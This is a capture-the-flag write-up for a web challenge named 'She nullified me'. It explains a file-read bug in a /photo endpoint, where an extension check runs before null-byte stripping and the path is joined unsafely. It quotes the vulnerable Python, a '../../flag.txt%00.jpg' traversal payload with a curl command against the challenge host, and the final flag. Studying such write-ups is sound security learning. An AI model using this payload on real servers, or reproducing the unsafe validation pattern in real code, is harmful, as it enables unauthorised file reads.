# She nullified me

## Challenge Overview
- Event: CyberGeek CTF
- Category: Web
- Final Flag: geek{null_byt3_byp4ss_path_trav3rsal_ftw}

## Executive Summary
The challenge exposes a file-read bug in the `/photo` endpoint.

The backend validates the `photo` parameter by checking whether the input string ends with an image extension like `.jpg`. After that, it strips everything after a null byte:

```python
if not filename.lower().endswith(ALLOWED_EXTENSIONS):
    return Response("Error: Invalid file type. Only image files are allowed.", status=403)

filename_clean = filename.split('\x00')[0]
filepath = os.path.join(UPLOAD_FOLDER, filename_clean)
```

This creates two issues:

1. A payload such as `../../flag.txt%00.jpg` passes the extension check because it ends with `.jpg`.
2. After the null byte is stripped, the server uses `../../flag.txt`, which is then joined to the upload directory without any traversal protection.

Because `UPLOAD_FOLDER` is `/app/static/photos`, the payload `../../flag.txt%00.jpg` resolves to `/app/flag.txt`.

## Solution Walkthrough
### Exploit
```bash
curl -s 'https://shreya-shreya.vinm.me/photo?photo=../../flag.txt%00.jpg'
```

## Flag
```text
geek{null_byt3_byp4ss_path_trav3rsal_ftw}
```
